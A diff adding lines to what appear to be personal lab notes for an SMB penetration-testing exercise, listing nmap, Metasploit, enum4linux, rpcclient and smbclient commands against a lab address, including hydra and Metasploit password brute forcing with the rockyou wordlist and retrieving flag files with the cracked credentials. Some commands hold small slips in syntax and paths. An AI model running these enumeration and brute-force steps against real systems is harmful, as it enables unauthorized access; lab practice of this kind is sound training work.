@@ -273,6 +273,63 @@ rpcclient -U "" -N 192.168.32.3
 enumdomusers
 lookupnames admin
 
+nmap -p445 smb-enum-shares 192.168.23.3
+nmap -p445 --script smb-enum-shares 192.168.23.3
+
+msfconsole
+use auxiliary/scanner/smb/smb-enumshares
+set RHOSTS 192.168.23.3
+show options
+run
+
+enum4linux -S 192.168.23.3
+smbclient -L 192.168.23.3
+enum4linux -G 192.168.23.3
+
+rpcclient -U "" -N 192.168.23.3
+enumdomgroups
+
+enum4linux -i 192.168.23.3
+smbclient //192.168.23.3/public -N
+help
+ls
+get flag //download
+cat flag
+
+ip a
+msfconsole
+use auxiliary/scanner/smb/smb-login
+info
+options
+set RHOSTS 192.168.23.3
+set PASS_FILE /usr/share/wordlist/metasploit/unix_password.txt
+set smbuser jane
+options
+run
+
+gzip -d /usr/share/wordlist/rockyou.txt.gz
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.23.3 smb
+smbmap -H 192.168.23.3 -u admin -p password1
+smbclient -L 192.168.23.3 -U jane
+smbclient //192.168.23.3/jane -U jane
+smbclient //192.168.23.3/admin -U admin
+get flag.tar.gz
+exit
+tar -xf flag.tar.gz
+ls
+
+msfconsole
+use auxiliary/scanner/smb/pipe-auditor
+set smbuser admin
+set smbpass password1
+set RHOSTS 192.168.23.3
+options
+run
+exit
+
+enum4linux -r -u "admin" -p "password1" 192.168.23.3 //looking for users
+
+
 
 
 
